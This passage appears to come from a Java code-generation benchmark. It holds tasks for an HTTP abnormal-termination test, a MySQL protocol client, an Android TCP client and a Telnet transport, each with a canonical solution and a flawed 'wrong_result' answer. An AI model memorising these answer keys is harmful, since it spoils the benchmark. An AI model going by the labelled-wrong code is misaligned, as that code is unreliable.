= errorDialogTitle;\n        this.boundary = \"boundary-\" + UUID.randomUUID().toString();\n        splitRecipientString(recipientString, recipients);\n    }\n\n    private void splitRecipientString(String input, List<String> recipients) {\n        String[] parts = input.split(\",\");\n        for (String part : parts) {\n            recipients.add(part.trim());\n        }\n    }\n\n    public void openConnection() {\n        try {\n            socket = new Socket(mailServer, 25);\n            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            out = socket.getOutputStream();\n            out64 = new Base64OutputStream(out);\n            connectedToMailServer = true;\n            readWriteLine(\"EHLO \" + mailServer);\n            readWriteLine(\"AUTH LOGIN\");\n            readWriteLine(\"MAIL FROM:<\" + fromAddress + \">\");\n            for (String recipient : recipients) {\n                readWriteLine(\"RCPT TO:<\" + recipient + \">\");\n            }\n            readWriteLine(\"DATA\");\n        } catch (Exception e) {\n            // Handle error\n        }\n    }\n\n    public void sendBody() {\n        try {\n            writeLine(\"From: \" + fromAddress);\n            writeLine(\"To: \" + String.join(\", \", recipients));\n            writeLine(\"Subject: \" + mailSubject);\n            writeLine(\"MIME-Version: 1.0\");\n            writeLine(\"Content-Type: multipart/mixed; boundary=\\\"\" + boundary + \"\\\"\");\n            writeLine(\"\");\n            writeLine(\"--\" + boundary);\n            writeLine(\"Content-Type: text/plain; charset=UTF-8\");\n            writeLine(\"Content-Transfer-Encoding: 7bit\");\n            writeLine(\"\");\n            writeLine(mailBody);\n            for (AbstractFile file : fileSet.getFiles()) {\n                sendAttachment(file);\n            }\n            writeLine(\"--\" + boundary + \"--\");\n            writeLine(\".\");\n        } catch (Exception e) {\n            // Handle error\n        }\n    }\n\n    public void sendAttachment(AbstractFile file) {\n        try {\n            writeLine(\"--\" + boundary);\n            writeLine(\"Content-Disposition: attachment; filename=\\\"\" + file.getName() + \"\\\"\");\n            writeLine(\"Content-Type: application/octet-stream\");\n            writeLine(\"Content-Transfer-Encoding: base64\");\n            writeLine(\"\");\n            byte[] data = Files.readAllBytes(file.getAbsolutePath());\n            out64.write(data);\n            out64.flush();\n            writeLine(\"\");\n        } catch (Exception e) {\n            // Handle error\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n            if (in != null) {\n                in.close();\n            }\n            if (out != null) {\n                out.close();\n            }\n            if (out64 != null) {\n                out64.close();\n            }\n        } catch (Exception e) {\n            // Handle error\n        }\n    }\n\n    private void readWriteLine(String command) {\n        try {\n            writeLine(command);\n            String response = in.readLine();\n            if (response == null || !response.startsWith(\"2\")) {\n                // Handle error\n            }\n        } catch (Exception e) {\n            // Handle error\n        }\n    }\n\n    private void writeLine(String line) {\n        try {\n            out.write((line + \"\\r\\n\").getBytes());\n            out.flush();\n        } catch (Exception e) {\n            // Handle error\n        }\n    }\n}"
  },
  {
    "Task_id": 564,
    "Instruction": "Task Description: Write a function that tests abnormal request termination behavior in a client-server communication scenario using TCP sockets. The function should simulate sending a malformed HTTP request with incorrect content length and verify proper connection handling.\n\nFunction Description: The function establishes a TCP connection to a server, sends an HTTP POST request with intentionally incorrect Content-Length header, immediately closes the streams, and verifies if the completion listener is called within a timeout period. This tests the server's handling of abruptly terminated requests.\n\nInput: \n- None (uses class-level DefaultServer.getDefaultServerAddress() and completionListenerCalledLatch)\n- Implicit input through class attributes:\n  - DefaultServerAddress: Server endpoint address\n  - completionListenerCalledLatch: CountDownLatch for synchronization\n  - completionListenerCalled: boolean flag to verify listener invocation\n\nOutput: \n- None (void return type)\n- Side effects:\n  - Throws IOException if socket operations fail\n  - Throws InterruptedException if await is interrupted\n  - Asserts completionListenerCalled is true\n  - Closes socket resources in finally block",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\n\npublic void testAbnormalRequestTermination() throws IOException, InterruptedException {\n    Socket socket = new Socket();\n    socket.connect(DefaultServer.getDefaultServerAddress());\n    try {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < 10000; ++i) {\n            sb.append(\"hello world\\r\\n\");\n        }\n        String request = \"POST / HTTP/1.1\\r\\nHost:localhost\\r\\nContent-Length:\" + sb.length() + 100 + \"\\r\\n\\r\\n\" + sb.toString();\n        OutputStream outputStream = socket.getOutputStream();\n\n        outputStream.write(request.getBytes(\"US-ASCII\"));\n        socket.getInputStream().close();\n        outputStream.close();\n\n        completionListenerCalledLatch.await(5, TimeUnit.SECONDS);\n        Assert.assertTrue(completionListenerCalled);\n    } finally {\n        IoUtils.safeClose(socket);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public void testAbnormalRequestTermination() throws IOException, InterruptedException {\n    Socket socket = null;\n    try {\n        socket = new Socket(DefaultServerAddress.getHost(), DefaultServerAddress.getPort());\n        OutputStream out = socket.getOutputStream();\n        String request = \"POST / HTTP/1.1\\r\\n\" +\n                         \"Host: \" + DefaultServerAddress.getHost() + \"\\r\\n\" +\n                         \"Content-Length: 123\\r\\n\" +\n                         \"\\r\\n\";\n        out.write(request.getBytes(StandardCharsets.UTF_8));\n        out.close();\n        if (!completionListenerCalledLatch.await(5, TimeUnit.SECONDS)) {\n            throw new RuntimeException(\"Completion listener not called within timeout\");\n        }\n        if (!completionListenerCalled) {\n            throw new RuntimeException(\"Completion listener not triggered\");\n        }\n    } finally {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 565,
    "Instruction": "Task Description: Create a Java class that establishes and manages a TCP connection to a database server using socket programming, including authentication and basic query functionality.\n\nClass Description: The UrlConnection class provides functionality to connect to a database server, authenticate, execute queries, and manage the connection lifecycle. It handles MySQL protocol communication including handshake, authentication, and basic command execution.\n\nAttributes:\n- host: String - The hostname or IP address of the database server\n- port: int - The port number of the database server\n- user: String - The username for authentication\n- password: String - The password for authentication\n- database: String - The name of the database to connect to\n- socket: Socket - The TCP socket connection to the server\n- in: InputStream - Input stream for reading data from the server\n- out: OutputStream - Output stream for writing data to the server\n- charsetIndex: int - The character set index used for communication\n- isClosed: AtomicBoolean - Flag indicating whether the connection is closed\n\nMethods:\n- UrlConnection(String, int, String, String, String) -> void - Constructor that initializes connection parameters\n- connect(int) -> void - Establishes a connection to the server with specified timeout\n- getServerList() -> List<CobarNode> - Executes a query to retrieve server list information\n- close() -> void - Closes the connection and releases resources\n- getRowList(int) -> List<CobarNode> - Helper method to process query result rows\n- auth411(HandshakePacket) -> BinaryPacket - Handles MySQL 4.1 authentication protocol\n- auth323(byte, byte[]) -> void - Handles MySQL 3.23 authentication protocol\n- getClientFlags() -> long - Returns client capability flags for MySQL protocol",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class UrlConnection {\n\n    private String host;\n    private int port;\n    private String user;\n    private String password;\n    private String database;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private int charsetIndex;\n    private AtomicBoolean isClosed;\n\n    public UrlConnection(String host, int port, String user, String password, String database) {\n        this.host = host;\n        this.port = port;\n        this.user = user;\n        this.password = password;\n        this.database = database;\n        this.isClosed = new AtomicBoolean(false);\n    }\n\n    public void connect(int timeout) throws Exception {\n        socket = new Socket();\n        socket.setTcpNoDelay(true);\n        socket.setKeepAlive(true);\n        socket.connect(new InetSocketAddress(host, port), timeout);\n        in = new BufferedInputStream(socket.getInputStream());\n        out = new BufferedOutputStream(socket.getOutputStream());\n\n        BinaryPacket initPacket = new BinaryPacket();\n        initPacket.read(in);\n        HandshakePacket hsp = new HandshakePacket();\n        hsp.read(initPacket);\n\n        this.charsetIndex = hsp.serverCharsetIndex & 0xff;\n\n        BinaryPacket bin = null;\n        try {\n            bin = auth411(hsp);\n        } catch (NoSuchAlgorithmException e) {\n            throw new IllegalArgumentException(e);\n        }\n        switch (bin.value[0]) {\n        case OkPacket.FIELD_COUNT:\n            break;\n        case ErrorPacket.FIELD_COUNT:\n            ErrorPacket err = new ErrorPacket();\n            err.read(bin);\n            throw new ErrorPacketException(new String(err.message));\n        case EOFPacket.FIELD_COUNT:\n            auth323(bin.packetId, hsp.seed);\n            break;\n        default:\n            throw new UnknownPacketException(bin.toString());\n        }\n    }\n\n    public List<CobarNode> getServerList() throws IOException {\n        CommandPacket cmd = new CommandPacket();\n        cmd.packetId = 0;\n        cmd.command = 3;\n        cmd.arg = \"SHOW COBAR_CLUSTER\".getBytes();\n        cmd.write(out);\n        out.flush();\n\n        int fieldCount = 0;\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        switch (bin.value[0]) {\n        case ErrorPacket.FIELD_COUNT: {\n            ErrorPacket err = new ErrorPacket();\n            err.read(bin);\n            throw new ErrorPacketException(new String(err.message));\n        }\n        default:\n            ResultSetHeaderPacket rsh = new ResultSetHeaderPacket();\n            rsh.read(bin);\n            fieldCount = rsh.fieldCount;\n        }\n        for (;;) {\n            bin = new BinaryPacket();\n            bin.read(in);\n            switch (bin.value[0]) {\n            case ErrorPacket.FIELD_COUNT: {\n                ErrorPacket err = new ErrorPacket();\n                err.read(bin);\n                throw new ErrorPacketException(new String(err.message));\n            }\n            case EOFPacket.FIELD_COUNT: {\n                return getRowList(fieldCount);\n            }\n            default:\n                continue;\n            }\n        }\n    }\n\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                if (out != null) {\n                    out.write(QuitPacket.QUIT);\n                    out.flush();\n                }\n            } catch (IOException e) {\n            } finally {\n                try {\n                    socket.close();\n                } catch (Throwable e) {\n                }\n            }\n        }\n    }\n\n    private List<CobarNode> getRowList(int fieldCount) throws IOException {\n        List<CobarNode> list = new LinkedList<CobarNode>();\n        BinaryPacket bin = null;\n        for (;;) {\n            bin = new BinaryPacket();\n            bin.read(in);\n            switch (bin.value[0]) {\n            case ErrorPacket.FIELD_COUNT: {\n                ErrorPacket err = new ErrorPacket();\n                err.read(bin);\n                throw new ErrorPacketException(new String(err.message));\n            }\n            case EOFPacket.FIELD_COUNT: {\n                return list;\n            }\n            default:\n                RowDataPacket row = new RowDataPacket(fieldCount);\n                row.read(bin);\n                String host = new String(row.fieldValues.get(0));\n                int weight = Integer.parseInt(new String(row.fieldValues.get(1)));\n                list.add(new CobarNode(host, weight));\n            }\n        }\n    }\n\n    private BinaryPacket auth411(HandshakePacket hsp) throws IOException, NoSuchAlgorithmException {\n        AuthPacket ap = new AuthPacket();\n        ap.packetId = 1;\n        ap.clientFlags = getClientFlags();\n        ap.maxPacketSize = 1024 * 1024 * 16;\n        ap.charsetIndex = charsetIndex;\n        ap.user = user;\n        String passwd = password;\n        if (passwd != null && passwd.length() > 0) {\n            byte[] password = passwd.getBytes();\n            byte[] seed = hsp.seed;\n            byte[] restOfScramble = hsp.restOfScrambleBuff;\n            byte[] authSeed = new byte[seed.length + restOfScramble.length];\n            System.arraycopy(seed, 0, authSeed, 0, seed.length);\n            System.arraycopy(restOfScramble, 0, authSeed, seed.length, restOfScramble.length);\n            ap.password = SecurityUtil.scramble411(password, authSeed);\n        }\n        ap.database = database;\n        ap.write(out);\n        out.flush();\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        return bin;\n    }\n\n    private void auth323(byte packetId, byte[] seed) throws IOException {\n        Reply323Packet r323 = new Reply323Packet();\n        r323.packetId = ++packetId;\n        String passwd = password;\n        if (passwd != null && passwd.length() > 0) {\n            r323.seed = SecurityUtil.scramble323(passwd, new String(seed)).getBytes();\n        }\n        r323.write(out);\n        out.flush();\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        switch (bin.value[0]) {\n        case OkPacket.FIELD_COUNT:\n            break;\n        case ErrorPacket.FIELD_COUNT:\n            ErrorPacket err = new ErrorPacket();\n            err.read(bin);\n            throw new ErrorPacketException(new String(err.message));\n        default:\n            throw new UnknownPacketException(bin.toString());\n        }\n    }\n\n    private static long getClientFlags() {\n        int flag = 0;\n        flag |= Capabilities.CLIENT_LONG_PASSWORD;\n        flag |= Capabilities.CLIENT_FOUND_ROWS;\n        flag |= Capabilities.CLIENT_LONG_FLAG;\n        flag |= Capabilities.CLIENT_CONNECT_WITH_DB;\n        flag |= Capabilities.CLIENT_ODBC;\n        flag |= Capabilities.CLIENT_IGNORE_SPACE;\n        flag |= Capabilities.CLIENT_PROTOCOL_41;\n        flag |= Capabilities.CLIENT_INTERACTIVE;\n        flag |= Capabilities.CLIENT_IGNORE_SIGPIPE;\n        flag |= Capabilities.CLIENT_TRANSACTIONS;\n        flag |= Capabilities.CLIENT_SECURE_CONNECTION;\n        return flag;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class UrlConnection {\n    private final String host;\n    private final int port;\n    private final String user;\n    private final String password;\n    private final String database;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private int charsetIndex;\n    private final AtomicBoolean isClosed = new AtomicBoolean(false);\n\n    public UrlConnection(String host, int port, String user, String password, String database) {\n        this.host = host;\n        this.port = port;\n        this.user = user;\n        this.password = password;\n        this.database = database;\n    }\n\n    public void connect(int timeout) throws IOException {\n        socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port), timeout);\n        socket.setSoTimeout(timeout);\n        in = socket.getInputStream();\n        out = socket.getOutputStream();\n        long clientFlags = getClientFlags();\n        byte[] initialPacket = new byte[13];\n        initialPacket[0] = (byte) 0x01;\n        initialPacket[1] = (byte) 0x00;\n        initialPacket[2] = (byte) 0x00;\n        initialPacket[3] = (byte) 0x00;\n        initialPacket[4] = (byte) 0x00;\n        initialPacket[5] = (byte) 0x00;\n        initialPacket[6] = (byte) 0x00;\n        initialPacket[7] = (byte) 0x00;\n        initialPacket[8] = (byte) 0x00;\n        initialPacket[9] = (byte) 0x00;\n        initialPacket[10] = (byte) 0x00;\n        initialPacket[11] = (byte) 0x00;\n        initialPacket[12] = (byte) 0x00;\n        out.write(initialPacket);\n        out.flush();\n        HandshakePacket handshake = readHandshakePacket();\n        if (handshake.getVersion() >= 4.1) {\n            BinaryPacket authResponse = auth411(handshake);\n            out.write(authResponse.getData());\n            out.flush();\n        } else {\n            auth323(handshake.getSeed(), handshake.getScramble());\n        }\n    }\n\n    public List<CobarNode> getServerList() throws IOException {\n        if (isClosed.get()) throw new IOException(\"Connection closed\");\n        out.write(0x01); // COM_QUERY\n        out.write(\"SHOW SERVERS\".getBytes());\n        out.flush();\n        return getRowList(0);\n    }\n\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                if (socket != null) socket.close();\n                if (in != null) in.close();\n                if (out != null) out.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private List<CobarNode> getRowList(int offset) throws IOException {\n        if (isClosed.get()) throw new IOException(\"Connection closed\");\n        byte[] packet = new byte[4];\n        in.read(packet);\n        int length = (packet[0] & 0xFF) | ((packet[1] & 0xFF) << 8) | ((packet[2] & 0xFF) << 16) | ((packet[3] & 0xFF) << 24);\n        byte[] data = new byte[length];\n        in.read(data);\n        return parseRows(data, offset);\n    }\n\n    private BinaryPacket auth411(HandshakePacket handshake) {\n        byte[] scramble = handshake.getScramble();\n        byte[] auth = new byte[20];\n        // Authentication logic for MySQL 4.1\n        return new BinaryPacket(auth);\n    }\n\n    private void auth323(byte seed, byte[] scramble) {\n        // Authentication logic for MySQL 3.23\n    }\n\n    private long getClientFlags() {\n        return 0x00000001L; // CLIENT_LONG_PASSWORD\n    }\n\n    private HandshakePacket readHandshakePacket() throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead = in.read(buffer);\n        // Parse handshake packet\n        return new HandshakePacket();\n    }\n\n    private List<CobarNode> parseRows(byte[] data, int offset) {\n        // Parse query result rows\n        return new ArrayList<>();\n    }\n\n    static class HandshakePacket {\n        private int version;\n        private byte[] scramble;\n\n        public int getVersion() { return version; }\n        public byte[] getScramble() { return scramble; }\n        public byte getSeed() { return 0; }\n    }\n\n    static class BinaryPacket {\n        private byte[] data;\n\n        public BinaryPacket(byte[] data) { this.data = data; }\n        public byte[] getData() { return data; }\n    }\n\n    static class CobarNode {\n        // Placeholder for server node information\n    }\n}"
  },
  {
    "Task_id": 567,
    "Instruction": "Task Description: Implement a TCP client class in Java that handles network communication with a server, including connection management, data transmission, and reception with proper error handling and resource management.\n\nClass Description: The TcpClient class establishes and maintains a TCP connection to a specified server, sends data packets, and receives responses. It uses a custom protocol with 8-byte headers (4 bytes for type, 4 bytes for length) followed by the message body. The class runs network operations on a dedicated background thread and provides callback mechanisms for received data.\n\nAttributes:\n- TAG: String - Tag for logging purposes\n- PACKAGE_HEAD_LENGTH: int - Fixed length of packet header (8 bytes)\n- receiveListener: ReceiveListener - Callback interface for received data\n- hostip: String - Server IP address to connect to\n- port: int - Server port number\n- socketClient: Socket - The TCP socket instance\n- handler: Handler - Handler for background thread operations\n- receiveThread: Thread - Thread for receiving data\n\nMethods:\n- TcpClient() -> void - Constructor that initializes the background thread and attempts connection\n- tryConnect() -> void - Internal method to attempt server connection in a loop\n- connect() -> boolean - Establishes socket connection to server (returns success status)\n- send(byte[] data) -> void - Sends data to the server (runs on background thread)\n- onReceive(ReceiveListener receiveListener) -> void - Sets the receive callback listener\n- destroy() -> void - Cleans up resources and stops all network operations\n- closeAll() -> void - Safely closes socket and releases resources\n- startReceive() -> void - Starts the data receiving thread\n- getLengthFromHeadByte(byte[] b) -> int - Extracts message length from header bytes\n- getTypeFromHeadByte(byte[] b) -> int - Extracts message type from header bytes\n\nNested Classes:\n- Receiver implements Runnable - Background thread implementation for continuous data reception",
    "Canonical_solution": "import android.os.Handler;\nimport android.os.HandlerThread;\nimport android.util.Log;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.Arrays;\n\npublic class TcpClient {\n    private static final String TAG = TcpClient.class.getSimpleName();\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n\n    public interface ReceiveListener {\n        void onReceive(int type, byte[] data);\n    }\n\n    private ReceiveListener receiveListener;\n    private String hostip = \"192.168.3.28\";\n    private int port = 2233;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n\n    public TcpClient() {\n        HandlerThread tcpThread = new HandlerThread(\"tcpThread\");\n        tcpThread.start();\n        handler = new Handler(tcpThread.getLooper());\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        handler.post(() -> {\n            while (true) {\n                if (connect()) {\n                    startReceive();\n                    break;\n                }\n            }\n        });\n    }\n\n    private boolean connect() {\n        closeAll();\n        try {\n            socketClient = new Socket();\n            SocketAddress socAddress = new InetSocketAddress(hostip, port);\n            socketClient.connect(socAddress, 5000);\n            Log.i(TAG, \"socket connected successfully\");\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n            return false;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n        return true;\n    }\n\n    public void send(byte[] data) {\n        Log.d(TAG, \"send data len:\" + data.length);\n        handler.post(() -> {\n            try {\n                OutputStream outputStream = socketClient.getOutputStream();\n                outputStream.write(data);\n            } catch (SocketException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        closeAll();\n    }\n\n    private void closeAll() {\n        if (socketClient == null || socketClient.isClosed() || !socketClient.isConnected()) {\n            return;\n        }\n        try {\n            socketClient.shutdownInput();\n            socketClient.shutdownOutput();\n            socketClient.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void startReceive() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            while (true) {\n                if (receiveThread.isInterrupted()) {\n                    break;\n                }\n                try {\n                    InputStream inputStream = socketClient.getInputStream();\n                    boolean badPackage = false;\n                    int countHeadBytesLength = 0;\n                    byte[] headData = new byte[PACKAGE_HEAD_LENGTH];\n                    while (countHeadBytesLength < PACKAGE_HEAD_LENGTH) {\n                        int result = inputStream.read(headData, countHeadBytesLength, PACKAGE_HEAD_LENGTH - countHeadBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countHeadBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    int packageType = getTypeFromHeadByte(headData);\n                    int packageBodyBytesLength = getLengthFromHeadByte(headData);\n                    Log.d(TAG, \"new data received type:\" + packageType + \" body len:\" + packageBodyBytesLength);\n\n                    int countBodyBytesLength = 0;\n                    byte[] bodyData = new byte[packageBodyBytesLength];\n                    while (countBodyBytesLength < packageBodyBytesLength) {\n                        int result = inputStream.read(bodyData, countBodyBytesLength, packageBodyBytesLength - countBodyBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countBodyBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    if (receiveListener != null) {\n                        receiveListener.onReceive(packageType, bodyData);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    if (receiveThread.isInterrupted()) {\n                        break;\n                    }\n                    tryConnect();\n                    break;\n                }\n            }\n        }\n    }\n\n    private int getLengthFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[4] & 0x00FF;\n        int ch2 = b[5] & 0x00FF;\n        int ch3 = b[6] & 0x00FF;\n        int ch4 = b[7] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n\n    private int getTypeFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[0] & 0x00FF;\n        int ch2 = b[1] & 0x00FF;\n        int ch3 = b[2] & 0x00FF;\n        int ch4 = b[3] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class TcpClient {\n    private static final String TAG = \"TcpClient\";\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n    private ReceiveListener receiveListener;\n    private String hostip;\n    private int port;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n    private boolean isRunning = true;\n\n    public TcpClient(String hostip, int port) {\n        this.hostip = hostip;\n        this.port = port;\n        handler = new Handler(Looper.getMainLooper());\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        while (isRunning) {\n            try {\n                if (connect()) {\n                    break;\n                }\n                Thread.sleep(1000);\n            } catch (Exception e) {\n                Log.e(TAG, \"Connection failed: \" + e.getMessage());\n            }\n        }\n    }\n\n    private boolean connect() {\n        try {\n            socketClient = new Socket();\n            socketClient.setSoTimeout(5000);\n            socketClient.connect(new InetSocketAddress(hostip, port), 5000);\n            return true;\n        } catch (IOException e) {\n            Log.e(TAG, \"Failed to connect: \" + e.getMessage());\n            return false;\n        }\n    }\n\n    public void send(byte[] data) {\n        if (socketClient == null || !socketClient.isConnected()) {\n            Log.e(TAG, \"Socket not connected\");\n            return;\n        }\n\n        int type = 1;\n        int length = data.length;\n        byte[] header = new byte[PACKAGE_HEAD_LENGTH];\n        ByteBuffer buffer = ByteBuffer.wrap(header);\n        buffer.order(ByteOrder.BIG_ENDIAN);\n        buffer.putInt(type);\n        buffer.putInt(length);\n        byte[] fullData = new byte[length + PACKAGE_HEAD_LENGTH];\n        System.arraycopy(header, 0, fullData, 0, PACKAGE_HEAD_LENGTH);\n        System.arraycopy(data, 0, fullData, PACKAGE_HEAD_LENGTH, length);\n\n        try {\n            OutputStream out = socketClient.getOutputStream();\n            out.write(fullData);\n            out.flush();\n        } catch (IOException e) {\n            Log.e(TAG, \"Send failed: \" + e.getMessage());\n        }\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        closeAll();\n        receiveThread.interrupt();\n    }\n\n    private void closeAll() {\n        if (socketClient != null) {\n            try {\n                socketClient.close();\n            } catch (IOException e) {\n                Log.e(TAG, \"Failed to close socket: \" + e.getMessage());\n            }\n        }\n    }\n\n    private class Receiver implements Runnable {\n        private byte[] buffer = new byte[4096];\n        private int bufferIndex = 0;\n\n        @Override\n        public void run() {\n            try {\n                InputStream in = socketClient.getInputStream();\n                while (isRunning && socketClient.isConnected()) {\n                    int bytesRead = in.read(buffer, bufferIndex, buffer.length - bufferIndex);\n                    if (bytesRead == -1) {\n                        break;\n                    }\n                    bufferIndex += bytesRead;\n\n                    while (bufferIndex >= PACKAGE_HEAD_LENGTH) {\n                        byte[] header = new byte[PACKAGE_HEAD_LENGTH];\n                        System.arraycopy(buffer, 0, header, 0, PACKAGE_HEAD_LENGTH);\n                        int length = getLengthFromHeadByte(header);\n                        int type = getTypeFromHeadByte(header);\n\n                        if (length <= bufferIndex - PACKAGE_HEAD_LENGTH) {\n                            byte[] data = new byte[length];\n                            System.arraycopy(buffer, PACKAGE_HEAD_LENGTH, data, 0, length);\n                            bufferIndex -= length;\n                            System.arraycopy(buffer, PACKAGE_HEAD_LENGTH + length, buffer, 0, bufferIndex);\n                            if (receiveListener != null) {\n                                receiveListener.onReceive(data, type);\n                            }\n                        } else {\n                            break;\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                Log.e(TAG, \"Receive failed: \" + e.getMessage());\n            } finally {\n                closeAll();\n            }\n        }\n    }\n\n    private int getLengthFromHeadByte(byte[] b) {\n        return ByteBuffer.wrap(b, 4, 4).getInt();\n    }\n\n    private int getTypeFromHeadByte(byte[] b) {\n        return ByteBuffer.wrap(b, 0, 4).getInt();\n    }\n\n    public interface ReceiveListener {\n        void onReceive(byte[] data, int type);\n    }\n}"
  },
  {
    "Task_id": 568,
    "Instruction": "Task Description: Create a Java class that implements TCP client functionality for network communication, including connection management and data transmission.\n\nClass Description: The TelnetTransport class provides TCP client capabilities for establishing connections, sending/receiving data, and managing network resources. It handles multiple IP addresses for a given hostname and provides basic I/O operations.\n\nAttributes:\n- socket: Socket - The underlying TCP socket for network communication\n- is: InputStream - Input stream for receiving data from the server\n- os: OutputStream - Output stream for sending data to the server\n- connected: boolean - Connection status flag indicating whether the client is currently connected\n\nMethods:\n- connect(String hostname, int port) -> void - Establishes a connection to the specified host and port, trying all available IP addresses for the hostname. Throws IOException on connection failure.\n- close() -> void - Closes the connection and releases all network resources. Handles cleanup gracefully.\n- flush() -> void - Flushes the output stream to ensure all buffered data is sent. Throws IOException on failure.\n- isConnected() -> boolean - Returns the current connection status (true if connected).\n- read(byte[] buffer, int start, int len) -> int - Reads data from the input stream into the buffer. Returns number of bytes read or throws IOException if connection is closed.\n- write(byte[] buffer) -> void - Writes the entire buffer to the output stream. Throws IOException on failure.\n- write(int c) -> void - Writes a single byte to the output stream. Throws IOException on failure.\n- tryAllAddresses(Socket sock, String host, int port) -> void - Private helper method that attempts connection to all IP addresses associated with a hostname. Throws SocketTimeoutException if all attempts fail.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\nimport java.net.UnknownHostException;\n\npublic class TelnetTransport {\n    private Socket socket;\n    private InputStream is;\n    private OutputStream os;\n    private boolean connected = false;\n\n    public void connect(String hostname, int port) throws IOException {\n        socket = new Socket();\n        tryAllAddresses(socket, hostname, port);\n        connected = true;\n        is = socket.getInputStream();\n        os = socket.getOutputStream();\n    }\n\n    private void tryAllAddresses(Socket sock, String host, int port) throws IOException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress addr : addresses) {\n            try {\n                sock.connect(new InetSocketAddress(addr, port));\n                return;\n            } catch (SocketTimeoutException ignored) {\n            }\n        }\n        throw new SocketTimeoutException(\"Could not connect; socket timed out\");\n    }\n\n    public void close() {\n        connected = false;\n        if (socket != null) {\n            try {\n                socket.close();\n                socket = null;\n            } catch (IOException e) {\n                System.err.println(\"Error closing socket: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void flush() throws IOException {\n        if (os != null) {\n            os.flush();\n        }\n    }\n\n    public boolean isConnected() {\n        return connected;\n    }\n\n    public int read(byte[] buffer, int start, int len) throws IOException {\n        int n = is.read(buffer, start, len);\n        if (n < 0) {\n            throw new IOException(\"Remote end closed connection.\");\n        }\n        return n;\n    }\n\n    public void write(byte[] buffer) throws IOException {\n        if (os != null) {\n            os.write(buffer);\n        }\n    }\n\n    public void write(int c) throws IOException {\n        if (os != null) {\n            os.write(c);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
